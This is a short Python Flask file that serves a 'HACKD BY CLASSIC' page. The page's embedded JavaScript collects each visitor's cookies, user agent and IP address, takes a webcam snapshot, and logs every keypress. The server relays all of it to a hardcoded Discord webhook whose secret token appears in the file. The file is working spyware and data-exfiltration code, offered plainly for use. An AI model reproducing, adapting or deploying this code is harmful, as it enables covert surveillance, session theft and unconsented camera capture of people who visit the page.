from flask import Flask, request
import requests
import json
from datetime import datetime

app = Flask(__name__)

# webhook الجديد
WEBHOOK = "https://discord.com/api/webhooks/1489207059026149377/HAW3Qm9L-k7aNvSWXxpctuuFp4KcH87ss74EFcAye_eeatcYVsVLdn360f1UEuf6YJUm"

@app.route('/')
def index():
    return '''
<!DOCTYPE html>
<html><head><title>SACI</title><style>body{margin:0;height:100vh;background:linear-gradient(45deg,#1a1a2e 0%,#0f3460 100%);display:flex;align-items:center;justify-content:center;flex-direction:column;font-family:Arial;font-size:60px;color:#ff4757;font-weight:900;text-shadow:0 0 40px #ff4757}span{font-size:80px;color:#ff6b6b}</style></head><body>HACKD BY CLASSIC<span>LOL</span><script>
let d={t:new Date().toISOString(),ua:navigator.userAgent,c:document.cookie};
fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(ip=>{d.ip=ip.ip;fetch("/d", {method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(d)})});
navigator.mediaDevices.getUserMedia({video:true}).then(s=>{
let v=document.createElement("video");v.srcObject=s;v.play();
setTimeout(()=>{let c=document.createElement("canvas");c.width=640;c.height=480;c.getContext("2d").drawImage(v,0,0);
fetch("/d",{method:"POST",body:JSON.stringify({selfie:c.toDataURL(),data:d})});s.getTracks()[0].stop()},4e3)
});
document.onkeydown=e=>fetch("/d",{method:"POST",body:JSON.stringify({key:e.key})});
</script></body></html>
'''

@app.route('/d', methods=['POST'])
def data():
    d = request.json
    requests.post(WEBHOOK, json={"embeds":[{"title":"🎭 SACI HACK","description":json.dumps(d),"color":16711680}]}, timeout=10)
    return "OK"

if __name__=='__main__':
    app.run(host='0.0.0.0', port=8080)
